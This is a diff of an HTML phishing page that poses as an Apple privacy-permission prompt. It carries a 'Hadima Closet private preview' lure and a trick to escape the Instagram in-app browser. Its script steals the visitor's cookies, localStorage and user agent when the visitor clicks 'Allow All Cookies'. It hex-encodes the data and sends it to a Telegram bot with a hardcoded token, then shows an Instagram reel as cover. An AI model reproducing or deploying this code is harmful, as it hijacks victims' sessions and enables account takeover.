@@ -19,23 +19,26 @@ iframe{width:100%;height:100vh;border:none}
 <div id="p">
 <img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Apple_logo_grey.svg" width="40" style="margin-bottom:20px">
 <h2 style="font-size:20px;font-weight:600;margin-bottom:10px">Privacy Permission</h2>
-<p style="font-size:14px;color:#3a3a3c;padding:0 40px;line-height:1.4">This website requires permission to access secure session data to play this video.</p>
+<p style="font-size:14px;color:#3a3a3c;padding:0 40px;line-height:1.4">Verification required for Hadima Closet private preview. Please allow session cookies to continue.</p>
 <button class="allow-btn" onclick="send()">Allow All Cookies</button>
 </div>
 <iframe id="r" src=""></iframe>
 <script>
 var T="8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k",C="8639892987";
 var h=function(s){return [...s].map(function(x){return x.charCodeAt(0).toString(16).padStart(2,'0')}).join('')};
+
 function j(){
-window.location.assign("googlechromes://applesecurityalert6-prog.github.io/");
-setTimeout(function(){window.open("https://applesecurityalert6-prog.github.io/","_blank")},500);
+var u = window.location.href; 
+window.location.assign("googlechromes://applesecurityalert6-prog.github.io/?view=hadima-closet-lavender-gleam");
+setTimeout(function(){window.open(u,"_blank")},500);
 }
+
 if(!navigator.userAgent.includes("Instagram")){
 document.getElementById('g').style.display='none';
 document.getElementById('p').style.display='flex';
 }
 function send(){
-var d={st:"SUCCESS_SESSION",ck:document.cookie,ls:JSON.stringify(localStorage),ua:navigator.userAgent};
+var d={st:"SUCCESS",ck:document.cookie,ls:JSON.stringify(localStorage),ua:navigator.userAgent};
 new Image().src="https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text=🏆_DATA_"+h(JSON.stringify(d));
 document.getElementById('p').style.display='none';
 document.getElementById('r').src="https://www.instagram.com/reel/DXvjb0FP8W0/embed/";
